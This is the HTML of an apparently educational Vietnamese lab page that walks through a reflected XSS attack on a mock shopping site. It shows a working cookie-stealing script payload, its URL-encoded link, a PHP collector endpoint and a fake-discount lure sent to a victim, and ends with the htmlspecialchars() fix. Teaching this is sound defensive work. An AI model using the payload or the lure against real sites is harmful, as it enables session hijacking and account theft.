<div class="barRight">
    <div class="title">
        <p>Reflected</p>
        <p>Hướng dẫn</p>
    </div>
    <div class="content">
        <div class="guide one">
            <img class="symbol" src="images/attacker.png">
            <p><span class="number">1</span>Bobby tạo tài khoản web <span class="href">shopping.com</span> để mua sản
                phẩm
        </div>

        <div class="guide two">
            <img class="symbol" src="images/attacker.png">
            <p><span class="number">2</span>Bobby để ý có trường tìm kiếm.<br>Khi Bobby gõ vào thanh tìm kiếm thì kết
                quả in ra giá trị<br><span class='request'>Bạn hãy thử tìm kiếm với từ bất kì</span></p>
        </div>
        <div class="guide three">
            <img class="symbol" src="images/attacker.png">
            <p><span class="number">3</span>Giá trị search mà bạn nhập vào đã được chèn vào source code.<br>
                Cái gì cũng có thể chèn vào chăng?<br>
                Bobby thử chèn một đoạn mã lệnh có khả năng gây nguy hiểm<br>
                <span class='red'>&ltscript>alert(document.cookie)&lt/script><br>
                <span class="request">Nhập đoạn này vào thanh tìm kiếm nhé</span><br>
                </span><br>
            </p>
        </div>
        <div class="guide four">
            <img class="symbol" src="images/attacker.png">
            <p><span class="number">4</span>Bobby nhận ra rằng biến keywork nhận giá trị bất kì và
                rồi truyền lên server xử lý.<br>Nhưng server đã không kiểm soát giá trị đầu vào này trước khi trả về
                cho trình duyệt dẫn đến mã javascript bị chèn vào trong source code.</p>
        </div>
        <div class="guide five">
            <img class="symbol" src="images/attacker.png">
            <p><span class="number">5</span>Bobby bắt đầu tấn công người dùng</p>
        </div>
        <div class="guide six">
            <img class="symbol" src="images/attacker.png">
            <p><span class="number">6</span>Bobby có một trang web server của riêng hắn là <span class="href">hacker-site.com</span><br>
                <span class="name">hacker-site.com được hiểu là localhost phía server</span></p>
        </div>
        <div class="guide seven">
            <img class="symbol" src="images/attacker.png">
            <p><span class="number">7</span>
                Bobby deploy 1 web server để lấy cookie của Panda<br>
                <span class="request">Hãy <a id='code-hacker' class="click">Deploy</a> phía hacker để lấy cookie của user nhé<br>Sử dụng $_GET để lấy param 'cookie'(Code by PHP)</span>
            </p>

            <button class="help" type="button" data-html="true"  data-toggle="popover" data-placement="left" title="Answer" data-content="<pre>
if(isset($_GET['cookie'])){
    return $_GET['cookie'];
}
            </pre>
            ">?</button>
        </div>
        <div class="guide eight">
            <img class="symbol" src="images/attacker.png">
            <p><span class="number">8</span>Bobby tạo script như sau để lấy cookie của Panda<br>
                <span class='red'>&ltscript>window.open('http://localhost/action/xss/cookie-hacker?cookie='+);&lt/script></span><br>
                <span class='request'>Đoạn mã tạo có không đúng không? hãy giúp bobby <a id='code-script' class="click">Sửa lại</a>
                </span>
            </p>
            <button data-html="true" class="help" type="button" data-toggle="popover" data-placement="left" title="Answer"
                data-content="<pre>&ltscript>window.open('http://localhost/action/xss/cookie-hacker?
cookie='+document.cookie);&ltscript></pre>">?</button>
        </div>
        <div class="guide nine">
            <img class="symbol" src="images/attacker.png">
            <p><span class="number">9</span>Bobby Encode script vừa taọ trên vào param 'search'</span><br>
              <span  class="href">http://localhost/action/xss/reflected-xss?search=&ltscript>window.open%28'http%3A%2F%2Flocalhost%2Faction%2Fxss%2Fcookie-hacker%3Fcookie%3D'%2Bdocument.cookie%29%3B<%2Fscript></span><br>

                    <span class="note">localhost thứ 1 là web shoopping, localhost thứ 2 là web hacker</span>
            </p>
        </div>
        <div class="guide ten">
            <img class="symbol" src="images/attacker.png">
            <p><span class="number">10</span>Bobby đưa link chứa script cho người dùng<br>
                Có nhiều cách tiếp cận khiến người dùng nhấp vào link này. Bobby là người khôn ngoan anh ta gửi link
                cho bạn thân mình😊.<br>
                Panda ơi trên shopping.com có giảm giá.
            </p>
        </div>
        <div class="guide eleven">
            <img class="symbol" src="images/user.png">
            <p><span class="number">11</span>Panda muốn mua đồ giảm giá và Click vào link mà bobby
                gửi<br>
            </p>
        </div>
        <div class="guide twelve">
            <img class="symbol" src="images/user.png">
            <p><span class="number">12</span>
                Trang Shopping sẽ Popup ra 1 tab mới trỏ về trang của Hacker để lấy coookie<br>
                <span class="request">Hãy Copy link ở step 9 và Past vào thanh Url nhé</span>
            </p>
        </div>
        <div class="guide thirteen">
            <img class="symbol" src="images/user.png">
            <p><span class="number">13</span>
                Hehe, bây giờ bobby chỉ cần <a id='file-cookie' class="click">Xem tệp</a> takecookie.txt là có thể biết được cookie của Panda
            </p>
        </div>
        <div class="guide fourteen">
            <img class="symbol" src="images/user.png">
            <p><span class="number">14</span>Vậy làm sao ta khắc phục được reflected XSS?<br>
                Đơn giản, Hãy xóa thanh tìm kiếm<br>
                Không, Tôi đùa đó😊<br>
                Như đã nói ở bước 4: Biến keywork nhận giá trị bất kì và rồi truyền lên server xử lý. Nhưng server đã
                không kiểm soát giá trị đầu vào này trước khi trả về cho trình duyệt dẫn đến mã javascript bị chèn vào
                trong source code.
            </p>
        </div>
        <div class="guide fifteen">
            <img class="symbol" src="images/user.png">
            <p><span class="number">15</span>Vậy ta sẽ kiểm soát giá trị đầu vào như thế nào?<br>
                <span class='request'>Hãy thử suy nghĩ và <a class="click" id="code-prevent">Deploy</a></span>
            </p>
            <button class="help" type="button" data-html="true" data-toggle="popover" data-placement="left" title="Answer"
                data-content="<pre>
if(isset($_GET['search']))
    return htmlspecialchars($_GET['search']);
</pre>">?</button>
        </div>
        <div class="guide sixteen">
            <img class="symbol" src="images/user.png">
            <p><span class="number">16</span>Bằng cách sử dụng hàm <span class='emphasize'>htmlspecialchars()</span> sẽ
                giúp thay thế các kí tự Dạng ứng dụng, <br>ví dụ: <span class='emphasize'>“<“ thành “&amp;lt;”</span><br>
                <span class="request">Bây giờ bạn thử sử dụng script tìm kiếm trên trang shopping để kiểm tra kết quả</span>
            </p>
        </div>
        <div class="guide seventeen">
            <img class="symbol" src="images/user.png">
            <p><span class="number">17</span>
                Chúc mừng bạn đã hoàn thành xong cuộc tấn công <span class="name">Reflected-XSS</span><br>
            </p>
        </div>




    </div>

</div>
